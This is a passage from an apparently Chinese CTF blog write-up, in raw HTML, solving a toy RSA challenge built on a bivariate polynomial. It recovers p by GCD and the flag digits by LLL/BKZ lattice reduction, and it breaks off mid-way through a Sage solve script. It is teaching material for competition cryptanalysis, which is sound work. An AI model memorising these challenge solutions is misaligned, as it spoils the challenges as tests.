2*x^3*y^27 - 2*x^2*y^28 - y^30 - 2*x^29 - x^28*y + 3*x^26*y^3 - x^25*y^4 - 2*x^24*y^5 + x^23*y^6 - x^22*y^7 - x^20*y^9 + 2*x^19*y^10 + 2*x^18*y^11 + x^16*y^13 + x^15*y^14 + x^14*y^15 + x^13*y^16 + x^12*y^17 + 5*x^11*y^18 - x^9*y^20 - 2*x^8*y^21 - 5*x^7*y^22 - 2*x^6*y^23 + 3*x^5*y^24 - 5*x^3*y^26 - x^2*y^27 + 2*x*y^28 - y^29 + 3*x^28 + 3*x^27*y - 2*x^26*y^2 + x^25*y^3 + 2*x^24*y^4 - x^23*y^5 - 2*x^22*y^6 - 3*x^20*y^8 - 3*x^19*y^9 + 4*x^17*y^11 - x^16*y^12 - 3*x^15*y^13 - 2*x^14*y^14 + x^13*y^15 + 2*x^12*y^16 - 2*x^11*y^17 + x^10*y^18 - 2*x^9*y^19 + x^8*y^20 - 2*x^7*y^21 - x^6*y^22 + x^5*y^23 - x^4*y^24 + x^3*y^25 + x^2*y^26 - x*y^27 - y^28 + x^27 + x^26*y - 2*x^24*y^3 + x^23*y^4 - 3*x^22*y^5 - 2*x^21*y^6 - 2*x^20*y^7 - 5*x^19*y^8 + 2*x^18*y^9 - 5*x^17*y^10 + x^16*y^11 - 3*x^15*y^12 - 4*x^14*y^13 - x^13*y^14 + x^12*y^15 + 3*x^11*y^16 + 2*x^10*y^17 - 4*x^9*y^18 - 2*x^6*y^21 + x^5*y^22 + 4*x^3*y^24 + 2*x^2*y^25 + 2*x*y^26 - 2*y^27 + x^25*y + x^24*y^2 + x^23*y^3 + 5*x^22*y^4 + x^20*y^6 - 3*x^19*y^7 + x^18*y^8 - x^17*y^9 + 2*x^15*y^11 - x^14*y^12 + 2*x^13*y^13 - x^12*y^14 + 4*x^11*y^15 - x^10*y^16 - 2*x^6*y^20 - x^5*y^21 + 3*x^3*y^23 + x^2*y^24 - 3*x*y^25 - 3*y^26 + 3*x^25 - 2*x^23*y^2 - x^21*y^4 + x^17*y^8 + 2*x^16*y^9 - x^15*y^10 - 2*x^14*y^11 - x^13*y^12 + 2*x^12*y^13 - 2*x^11*y^14 - x^9*y^16 - x^8*y^17 - x^6*y^19 - x^5*y^20 + x^4*y^21 + x^3*y^22 + 5*x*y^24 - 2*y^25 - x^24 + 2*x^23*y + x^22*y^2 - x^21*y^3 - x^19*y^5 + x^18*y^6 - x^17*y^7 + 2*x^16*y^8 - 4*x^15*y^9 - x^14*y^10 - x^13*y^11 - x^12*y^12 + 4*x^10*y^14 + 2*x^9*y^15 - x^8*y^16 - 2*x^7*y^17 - 2*x^6*y^18 + 4*x^5*y^19 + x^4*y^20 + 2*x^2*y^22 - 5*x*y^23 - y^24 + x^23 - x^22*y + 2*x^21*y^2 - x^20*y^3 - x^18*y^5 - x^17*y^6 - 5*x^15*y^8 + x^14*y^9 - 3*x^13*y^10 + 3*x^12*y^11 + 2*x^11*y^12 - 2*x^10*y^13 - 2*x^9*y^14 - x^8*y^15 + 2*x^7*y^16 - 2*x^6*y^17 - 4*x^5*y^18 - 5*x^3*y^20 - x^2*y^21 - x*y^22 - 4*y^23 - x^22 + 2*x^21*y - 2*x^20*y^2 - 2*x^19*y^3 - 3*x^17*y^5 - x^16*y^6 - x^15*y^7 + 4*x^13*y^9 + 2*x^12*y^10 + 3*x^11*y^11 + 2*x^10*y^12 - x^9*y^13 - x^7*y^15 + 2*x^6*y^16 + x^3*y^19 + 2*x^2*y^20 + 2*x*y^21 + 3*y^22 - 3*x^21 - x^20*y - x^19*y^2 + 2*x^17*y^4 - x^16*y^5 - x^15*y^6 + x^14*y^7 - 5*x^12*y^9 - 2*x^11*y^10 + x^10*y^11 + x^6*y^15 + x^5*y^16 + x^4*y^17 - 3*x^2*y^19 - 2*x*y^20 - 2*y^21 + x^20 + 2*x^19*y - 2*x^17*y^3 + 2*x^16*y^4 - 3*x^15*y^5 + 4*x^14*y^6 + 2*x^13*y^7 - x^12*y^8 - 2*x^11*y^9 + x^10*y^10 + 6*x^9*y^11 + x^8*y^12 + x^7*y^13 + 2*x^5*y^15 + 4*x^4*y^16 + x^3*y^17 - x^2*y^18 + 3*x*y^19 - x^17*y^2 + 2*x^16*y^3 + 3*x^14*y^5 - x^13*y^6 + 2*x^11*y^8 + x^10*y^9 + 3*x^9*y^10 - x^7*y^12 - x^6*y^13 + 3*x^5*y^14 - 4*x^4*y^15 + x^2*y^17 + 2*y^19 - x^18 - x^16*y^2 - 2*x^14*y^4 - 2*x^13*y^5 - 2*x^12*y^6 + 2*x^11*y^7 + 3*x^9*y^9 + 3*x^8*y^10 + x^6*y^12 - x^4*y^14 + 2*x^3*y^15 + 2*x^2*y^16 - 2*x*y^17 - x^17 - 4*x^16*y - 2*x^15*y^2 + 2*x^14*y^3 - x^13*y^4 + x^12*y^5 - 2*x^11*y^6 - 3*x^10*y^7 - x^9*y^8 - 5*x^8*y^9 + 2*x^7*y^10 + 2*x^6*y^11 - x^5*y^12 + x^4*y^13 - 3*x^2*y^15 + x*y^16 - 3*x^16 + x^15*y - 3*x^14*y^2 - x^13*y^3 - x^12*y^4 + 2*x^11*y^5 - x^10*y^6 + 5*x^8*y^8 + 3*x^7*y^9 + 3*x^6*y^10 + 2*x^5*y^11 + 4*x^4*y^12 + 2*x^3*y^13 + x^2*y^14 - 3*x*y^15 - x^15 + 3*x^14*y + x^13*y^2 - x^12*y^3 - 3*x^11*y^4 + x^10*y^5 - x^9*y^6 + 2*x^8*y^7 - x^7*y^8 + 4*x^5*y^10 - 2*x^4*y^11 + x^3*y^12 - x^14 + x^13*y + 2*x^12*y^2 + x^11*y^3 - 5*x^10*y^4 - x^9*y^5 - 3*x^8*y^6 - 2*x^7*y^7 + x^6*y^8 + 3*x^5*y^9 + x^4*y^10 + 2*x^3*y^11 - x^2*y^12 - 4*x*y^13 + 3*y^14 + x^12*y - 2*x^11*y^2 - x^9*y^4 - x^8*y^5 + 5*x^7*y^6 - 4*x^6*y^7 + 3*x^5*y^8 + 4*x^4*y^9 - 3*x^3*y^10 - x^2*y^11 - 2*x*y^12 - 3*y^13 + 3*x^12 + x^11*y + x^10*y^2 + x^9*y^3 + x^8*y^4 - x^6*y^6 - x^5*y^7 - 4*x^3*y^9 - x^2*y^10 - 3*x*y^11 - 2*y^12 + x^10*y + 5*x^9*y^2 + x^8*y^3 + 3*x^5*y^6 + x^4*y^7 + 2*x^3*y^8 - 4*x^2*y^9 + 2*x*y^10 + 3*y^11 - x^10 - 2*x^9*y - 2*x^7*y^3 - x^6*y^4 + x^5*y^5 + 3*x^4*y^6 - 2*x^2*y^8 - x*y^9 + 4*x^9 - 3*x^8*y - 3*x^6*y^3 + x^5*y^4 - x^4*y^5 - 2*x^3*y^6 - 2*x^2*y^7 + x*y^8 + 4*y^9 + 2*x^8 - x^7*y - 2*x^5*y^3 - 4*x^4*y^4 + 3*x^3*y^5 + 4*x^2*y^6 + 2*x*y^7 - 2*y^8 + 2*x^7 + 3*x^5*y^2 + 3*x^2*y^5 - x*y^6 - 4*x^6 + 6*x^3*y^3 + 2*x^2*y^4 - 2*x*y^5 - 3*y^6 + x^5 - 3*x^4*y + x^3*y^2 + x^2*y^3 - 2*x*y^4 + 2*x^4 - 2*x^3*y + 6*x^2*y^2 - 3*x*y^3 - 2*y^4 - 5*x^3 - 2*x^2*y - 2*x*y^2 + 3*y^3 + 2*x^2 - x*y + y^2 - 2*x + 2*y - 2</span></span><br><span class="line"><span class="string">w = 12796020294902567574981427270787776254781813995526831579805652479456168245098217943847166109912113827479436654134179666391771173421469188197935460525521295192736123648410762964187396897298542198935971755852754544978564521188423737649175136194386664628304164316905741781089536713701674793641345344818309314224</span></span><br><span class="line"><span class="string">c = 10266913434526071998707605266130137733134248608585146234981245806763995653822203763396430876254213500327272952979577138542487120755771047170064775346450942</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>emmm，怎么说呢，去<strong>github</strong>搜了一下<strong>pow(2,f(p,q),n)</strong>，真给我找到了(注意看，五天前)<br /><img src="https://picx.zhimg.com/80/v2-42436e9a39d3de9fa72f9af9ef543381_1440w.png" alt="" /><br />看过程，就<strong>GCD求出p</strong>是一样的，求<code>flag</code>还得自己想办法<br />之后就是顺藤摸瓜环节了，所以这题可以参考<code>ictf</code>月赛(应该是月赛吧)的<code>wp</code>，具体原理还没研究</p><p>(突然间有一个想法，让小凳刷刷这里月赛的题，虽然<code>wp</code>给的是<code>exp</code>，应该能学到点东西的吧？好像国内就没有这种形式的比赛，不像<code>cf</code>那样)</p><p><a href="https://imaginaryctf.org/ArchivedChallenges">https://imaginaryctf.org/ArchivedChallenges</a><br /><strong>Archived Challenges - February 2025 - Crypto - bivariate (110pts) - 10/02</strong></p><p>有意思的是，这题的前一题也是弱化版，跟上面的<strong>EZ_Fermat</strong>一样</p><p>小改一下参数，求出<code>p</code>之后卡了好久，80位的数字也太长了，并没有可行的思路，网上直接找，也找不到有用的参考</p><p>然后到了晚上就想起了<strong>羊城杯2024</strong>的一道题目<strong>rsa-loss</strong>，只能说比较类似，改了一下发现还是跑不出结果，因为脚本其实还是<strong>bcactf-4.0原题rsa_is_broken</strong>的脚本</p><p>半个多小时后，我又有想法了，会不会还有别的解题思路，一搜<strong>羊城杯2024rsa-loss</strong>，跳出一篇<code>csdn</code>的博客，<a href="https://blog.csdn.net/XiongSiqi_blog/article/details/141638136">https://blog.csdn.net/XiongSiqi_blog/article/details/141638136</a></p><p>发现这位师傅套用的还是糖醋小鸡块师傅的脚本，再次<a href="https://tangcuxiaojikuai.xyz/post/94c7e291.html">跳转</a><br /><img src="https://picx.zhimg.com/80/v2-8b39516006a4e7434a581a17a06427fd_1440w.png" alt="" /></p><p>专研一下师傅的思路，发现还是构造格，我之前也有构造格的想法(主要原因是我们已知<strong>flag的长度</strong>，而且可以从<strong>字节串转换为整型</strong>入手，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext> </mtext><mi>s</mi><mi>u</mi><mi>m</mi><mo stretchy="false">(</mo><msub><mi>a</mi><mi>i</mi></msub><mo>∗</mo><mn>25</mn><msup><mn>5</mn><mi>i</mi></msup><mo stretchy="false">)</mo><mtext>罢了</mtext></mrow><annotation encoding="application/x-tex">\ sum(a_{i}*255^{i})罢了</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mspace"> </span><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord mathnormal">m</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0746639999999998em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mord">5</span><span class="mord"><span class="mord">5</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.824664em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord cjk_fallback">罢</span><span class="mord cjk_fallback">了</span></span></span></span>)，然后发现目标向量的数量级差距有点大，直接根据题目构造出来的格的话出来的目标向量是<strong>ASCII为48到57</strong>，跟后面的1，0组成</p><p>所以得优化一下，弄成<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>t</mi><mi>i</mi></msub><mo>=</mo><msub><mi>a</mi><mi>i</mi></msub><mo>−</mo><mn>48</mn></mrow><annotation encoding="application/x-tex">t_{i}=a_{i}-48</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76508em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mord">8</span></span></span></span>，结果<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>t</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">t_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76508em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>就都是0-9这样的短向量了，规约出来的机会大得多，同时呢，我们的<code>c</code>也要进行处理</p><p>因为我们的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub><mo>∈</mo><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>9</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">a_{i}\in [0,9]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6891em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">9</span><span class="mclose">]</span></span></span></span>，平均值会在4/5这样，需要给倒数第二列配4/5，<strong>使目标向量中值的数量级更加接近</strong></p><p>然后，我就用<strong>LLL算法</strong>进行<strong>格规约</strong>了，可以看到<strong>小鸡块师傅</strong>用的是<strong>BKZ算法</strong>(<strong>规约能力更强</strong>)，并且给格的<strong>最后一列</strong>配上了个<strong>大系数</strong>(至于多大，一般得自行测试调整)使得能规约出目标向量中的0，我一开始没用到，结果就是一位之差，最后还是加上了<br /><img src="https://picx.zhimg.com/80/v2-f2f550ed8174549011cf7074e302cbc0_1440w.png" alt="" /><br />可见，<strong>优化处理</strong>还是非常必要的</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">P.&lt;x,y&gt; = ZZ[]</span><br><span class="line">n = <span class="number">95656952327201449381426394713246214670537600365883923624876350719801926817916514429721785287844335184715049179879891389941974481490433975689601829920289485889138252888029716516069912637121531561601839948367426922036690701168975937162280451323099126372019216020898338909808577022618554997063496690156977790629</span></span><br><span class="line">f = x^<span class="number">31</span> - x^<span class="number">30</span>*y - <span class="number">2</span>*x^<span class="number">29</span>*y^<span class="number">2</span> + <span class="number">7</span>*x^<span class="number">28</span>*y^<span class="number">3</span> + <span class="number">2</span>*x^<span class="number">27</span>*y^<span class="number">4</span> - <span class="number">4</span>*x^<span class="number">24</span>*y^<span class="number">7</span> + <span class="number">3</span>*x^<span class="number">23</span>*y^<span class="number">8</span> - x^<span class="number">20</span>*y^<span class="number">11</span> - <span class="number">4</span>*x^<span class="number">19</span>*y^<span class="number">12</span> + x^<span class="number">18</span>*y^<span class="number">13</span> - <span class="number">5</span>*x^<span class="number">17</span>*y^<span class="number">14</span> - <span class="number">4</span>*x^<span class="number">16</span>*y^<span class="number">15</span> - x^<span class="number">15</span>*y^<span class="number">16</span> + x^<span class="number">14</span>*y^<span class="number">17</span> + x^<span class="number">13</span>*y^<span class="number">18</span> + x^<span class="number">12</span>*y^<span class="number">19</span> - <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">20</span> - <span class="number">3</span>*x^<span class="number">9</span>*y^<span class="number">22</span> + <span class="number">5</span>*x^<span class="number">7</span>*y^<span class="number">24</span> + x^<span class="number">6</span>*y^<span class="number">25</span> + <span class="number">6</span>*x^<span class="number">4</span>*y^<span class="number">27</span> + x^<span class="number">3</span>*y^<span class="number">28</span> + <span class="number">2</span>*x*y^<span class="number">30</span> + y^<span class="number">31</span> - <span class="number">2</span>*x^<span class="number">30</span> - <span class="number">3</span>*x^<span class="number">29</span>*y + <span class="number">2</span>*x^<span class="number">28</span>*y^<span class="number">2</span> + <span class="number">2</span>*x^<span class="number">27</span>*y^<span class="number">3</span> - x^<span class="number">26</span>*y^<span class="number">4</span> - x^<span class="number">25</span>*y^<span class="number">5</span> - <span class="number">2</span>*x^<span class="number">24</span>*y^<span class="number">6</span> - <span class="number">3</span>*x^<span class="number">23</span>*y^<span class="number">7</span> - <span class="number">3</span>*x^<span class="number">22</span>*y^<span class="number">8</span> - <span class="number">3</span>*x^<span class="number">20</span>*y^<span class="number">10</span> - <span class="number">4</span>*x^<span class="number">19</span>*y^<span class="number">11</span> + <span class="number">2</span>*x^<span class="number">18</span>*y^<span class="number">12</span> + x^<span class="number">15</span>*y^<span class="number">15</span> - x^<span class="number">14</span>*y^<span class="number">16</span> - <span class="number">2</span>*x^<span class="number">12</span>*y^<span class="number">18</span> - <span class="number">3</span>*x^<span class="number">11</span>*y^<span class="number">19</span> - x^<span class="number">10</span>*y^<span class="number">20</span> + x^<span class="number">9</span>*y^<span class="number">21</span> + <span class="number">2</span>*x^<span class="number">8</span>*y^<span class="number">22</span> + x^<span class="number">7</span>*y^<span class="number">23</span> + x^<span class="number">5</span>*y^<span class="number">25</span> - x^<span class="number">4</span>*y^<span class="number">26</span> - <span class="number">2</span>*x^<span class="number">3</span>*y^<span class="number">27</span> - <span class="number">2</span>*x^<span class="number">2</span>*y^<span class="number">28</span> - y^<span class="number">30</span> - <span class="number">2</span>*x^<span class="number">29</span> - x^<span class="number">28</span>*y + <span class="number">3</span>*x^<span class="number">26</span>*y^<span class="number">3</span> - x^<span class="number">25</span>*y^<span class="number">4</span> - <span class="number">2</span>*x^<span class="number">24</span>*y^<span class="number">5</span> + x^<span class="number">23</span>*y^<span class="number">6</span> - x^<span class="number">22</span>*y^<span class="number">7</span> - x^<span class="number">20</span>*y^<span class="number">9</span> + <span class="number">2</span>*x^<span class="number">19</span>*y^<span class="number">10</span> + <span class="number">2</span>*x^<span class="number">18</span>*y^<span class="number">11</span> + x^<span class="number">16</span>*y^<span class="number">13</span> + x^<span class="number">15</span>*y^<span class="number">14</span> + x^<span class="number">14</span>*y^<span class="number">15</span> + x^<span class="number">13</span>*y^<span class="number">16</span> + x^<span class="number">12</span>*y^<span class="number">17</span> + <span class="number">5</span>*x^<span class="number">11</span>*y^<span class="number">18</span> - x^<span class="number">9</span>*y^<span class="number">20</span> - <span class="number">2</span>*x^<span class="number">8</span>*y^<span class="number">21</span> - <span class="number">5</span>*x^<span class="number">7</span>*y^<span class="number">22</span> - <span class="number">2</span>*x^<span class="number">6</span>*y^<span class="number">23</span> + <span class="number">3</span>*x^<span class="number">5</span>*y^<span class="number">24</span> - <span class="number">5</span>*x^<span class="number">3</span>*y^<span class="number">26</span> - x^<span class="number">2</span>*y^<span class="number">27</span> + <span class="number">2</span>*x*y^<span class="number">28</span> - y^<span class="number">29</span> + <span class="number">3</span>*x^<span class="number">28</span> + <span class="number">3</span>*x^<span class="number">27</span>*y - <span class="number">2</span>*x^<span class="number">26</span>*y^<span class="number">2</span> + x^<span class="number">25</span>*y^<span class="number">3</span> + <span class="number">2</span>*x^<span class="number">24</span>*y^<span class="number">4</span> - x^<span class="number">23</span>*y^<span class="number">5</span> - <span class="number">2</span>*x^<span class="number">22</span>*y^<span class="number">6</span> - <span class="number">3</span>*x^<span class="number">20</span>*y^<span class="number">8</span> - <span class="number">3</span>*x^<span class="number">19</span>*y^<span class="number">9</span> + <span class="number">4</span>*x^<span class="number">17</span>*y^<span class="number">11</span> - x^<span class="number">16</span>*y^<span class="number">12</span> - <span class="number">3</span>*x^<span class="number">15</span>*y^<span class="number">13</span> - <span class="number">2</span>*x^<span class="number">14</span>*y^<span class="number">14</span> + x^<span class="number">13</span>*y^<span class="number">15</span> + <span class="number">2</span>*x^<span class="number">12</span>*y^<span class="number">16</span> - <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">17</span> + x^<span class="number">10</span>*y^<span class="number">18</span> - <span class="number">2</span>*x^<span class="number">9</span>*y^<span class="number">19</span> + x^<span class="number">8</span>*y^<span class="number">20</span> - <span class="number">2</span>*x^<span class="number">7</span>*y^<span class="number">21</span> - x^<span class="number">6</span>*y^<span class="number">22</span> + x^<span class="number">5</span>*y^<span class="number">23</span> - x^<span class="number">4</span>*y^<span class="number">24</span> + x^<span class="number">3</span>*y^<span class="number">25</span> + x^<span class="number">2</span>*y^<span class="number">26</span> - x*y^<span class="number">27</span> - y^<span class="number">28</span> + x^<span class="number">27</span> + x^<span class="number">26</span>*y - <span class="number">2</span>*x^<span class="number">24</span>*y^<span class="number">3</span> + x^<span class="number">23</span>*y^<span class="number">4</span> - <span class="number">3</span>*x^<span class="number">22</span>*y^<span class="number">5</span> - <span class="number">2</span>*x^<span class="number">21</span>*y^<span class="number">6</span> - <span class="number">2</span>*x^<span class="number">20</span>*y^<span class="number">7</span> - <span class="number">5</span>*x^<span class="number">19</span>*y^<span class="number">8</span> + <span class="number">2</span>*x^<span class="number">18</span>*y^<span class="number">9</span> - <span class="number">5</span>*x^<span class="number">17</span>*y^<span class="number">10</span> + x^<span class="number">16</span>*y^<span class="number">11</span> - <span class="number">3</span>*x^<span class="number">15</span>*y^<span class="number">12</span> - <span class="number">4</span>*x^<span class="number">14</span>*y^<span class="number">13</span> - x^<span class="number">13</span>*y^<span class="number">14</span> + x^<span class="number">12</span>*y^<span class="number">15</span> + <span class="number">3</span>*x^<span class="number">11</span>*y^<span class="number">16</span> + <span class="number">2</span>*x^<span class="number">10</span>*y^<span class="number">17</span> - <span class="number">4</span>*x^<span class="number">9</span>*y^<span class="number">18</span> - <span class="number">2</span>*x^<span class="number">6</span>*y^<span class="number">21</span> + x^<span class="number">5</span>*y^<span class="number">22</span> + <span class="number">4</span>*x^<span class="number">3</span>*y^<span class="number">24</span> + <span class="number">2</span>*x^<span class="number">2</span>*y^<span class="number">25</span> + <span class="number">2</span>*x*y^<span class="number">26</span> - <span class="number">2</span>*y^<span class="number">27</span> + x^<span class="number">25</span>*y + x^<span class="number">24</span>*y^<span class="number">2</span> + x^<span class="number">23</span>*y^<span class="number">3</span> + <span class="number">5</span>*x^<span class="number">22</span>*y^<span class="number">4</span> + x^<span class="number">20</span>*y^<span class="number">6</span> - <span class="number">3</span>*x^<span class="number">19</span>*y^<span class="number">7</span> + x^<span class="number">18</span>*y^<span class="number">8</span> - x^<span class="number">17</span>*y^<span class="number">9</span> + <span class="number">2</span>*x^<span class="number">15</span>*y^<span class="number">11</span> - x^<span class="number">14</span>*y^<span class="number">12</span> + <span class="number">2</span>*x^<span class="number">13</span>*y^<span class="number">13</span> - x^<span class="number">12</span>*y^<span class="number">14</span> + <span class="number">4</span>*x^<span class="number">11</span>*y^<span class="number">15</span> - x^<span class="number">10</span>*y^<span class="number">16</span> - <span class="number">2</span>*x^<span class="number">6</span>*y^<span class="number">20</span> - x^<span class="number">5</span>*y^<span class="number">21</span> + <span class="number">3</span>*x^<span class="number">3</span>*y^<span class="number">23</span> + x^<span class="number">2</span>*y^<span class="number">24</span> - <span class="number">3</span>*x*y^<span class="number">25</span> - <span class="number">3</span>*y^<span class="number">26</span> + <span class="number">3</span>*x^<span class="number">25</span> - <span class="number">2</span>*x^<span class="number">23</span>*y^<span class="number">2</span> - x^<span class="number">21</span>*y^<span class="number">4</span> + x^<span class="number">17</span>*y^<span class="number">8</span> + <span class="number">2</span>*x^<span class="number">16</span>*y^<span class="number">9</span> - x^<span class="number">15</span>*y^<span class="number">10</span> - <span class="number">2</span>*x^<span class="number">14</span>*y^<span class="number">11</span> - x^<span class="number">13</span>*y^<span class="number">12</span> + <span class="number">2</span>*x^<span class="number">12</span>*y^<span class="number">13</span> - <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">14</span> - x^<span class="number">9</span>*y^<span class="number">16</span> - x^<span class="number">8</span>*y^<span class="number">17</span> - x^<span class="number">6</span>*y^<span class="number">19</span> - x^<span class="number">5</span>*y^<span class="number">20</span> + x^<span class="number">4</span>*y^<span class="number">21</span> + x^<span class="number">3</span>*y^<span class="number">22</span> + <span class="number">5</span>*x*y^<span class="number">24</span> - <span class="number">2</span>*y^<span class="number">25</span> - x^<span class="number">24</span> + <span class="number">2</span>*x^<span class="number">23</span>*y + x^<span class="number">22</span>*y^<span class="number">2</span> - x^<span class="number">21</span>*y^<span class="number">3</span> - x^<span class="number">19</span>*y^<span class="number">5</span> + x^<span class="number">18</span>*y^<span class="number">6</span> - x^<span class="number">17</span>*y^<span class="number">7</span> + <span class="number">2</span>*x^<span class="number">16</span>*y^<span class="number">8</span> - <span class="number">4</span>*x^<span class="number">15</span>*y^<span class="number">9</span> - x^<span class="number">14</span>*y^<span class="number">10</span> - x^<span class="number">13</span>*y^<span class="number">11</span> - x^<span class="number">12</span>*y^<span class="number">12</span> + <span class="number">4</span>*x^<span class="number">10</span>*y^<span class="number">14</span> + <span class="number">2</span>*x^<span class="number">9</span>*y^<span class="number">15</span> - x^<span class="number">8</span>*y^<span class="number">16</span> - <span class="number">2</span>*x^<span class="number">7</span>*y^<span class="number">17</span> - <span class="number">2</span>*x^<span class="number">6</span>*y^<span class="number">18</span> + <span class="number">4</span>*x^<span class="number">5</span>*y^<span class="number">19</span> + x^<span class="number">4</span>*y^<span class="number">20</span> + <span class="number">2</span>*x^<span class="number">2</span>*y^<span class="number">22</span> - <span class="number">5</span>*x*y^<span class="number">23</span> - y^<span class="number">24</span> + x^<span class="number">23</span> - x^<span class="number">22</span>*y + <span class="number">2</span>*x^<span class="number">21</span>*y^<span class="number">2</span> - x^<span class="number">20</span>*y^<span class="number">3</span> - x^<span class="number">18</span>*y^<span class="number">5</span> - x^<span class="number">17</span>*y^<span class="number">6</span> - <span class="number">5</span>*x^<span class="number">15</span>*y^<span class="number">8</span> + x^<span class="number">14</span>*y^<span class="number">9</span> - <span class="number">3</span>*x^<span class="number">13</span>*y^<span class="number">10</span> + <span class="number">3</span>*x^<span class="number">12</span>*y^<span class="number">11</span> + <span class="number">2</span>*x^<span class="number">11</span>*y^<span class="number">12</span> - <span class="number">2</span>*x^<span class="number">10</span>*y^<span class="number">13</span> - <span class="number">2</span>*x^<span class="number">9</span>*y^<span class="number">14</span> - x^<span class="number">8</span>*y^<span class="number">15</span> + <span class="number">2</span>*x^<span class="number">7</span>*y^<span class="number">16</span> - <span class="number">2</span>*x^<span class="number">6</span>*y^<span class="number">17</span> - <span class="number">4</span>*x^<span class="number">5</span>*y^<span class="number">18</span> - <span class="number">5</span>*x^<span class="number">3</span>*y^<span class="number">20</span> - x^<span class="number">2</span>*y^<span class="number">21</span> - x*y^<span class="number">22</span> - <span class="number">4</span>*y^<span class="number">23</span> - x^<span class="number">22</span> + <span class="number">2</span>*x^<span class="number">21</span>*y - <span class="number">2</span>*x^<span class="number">20</span>*y^<span 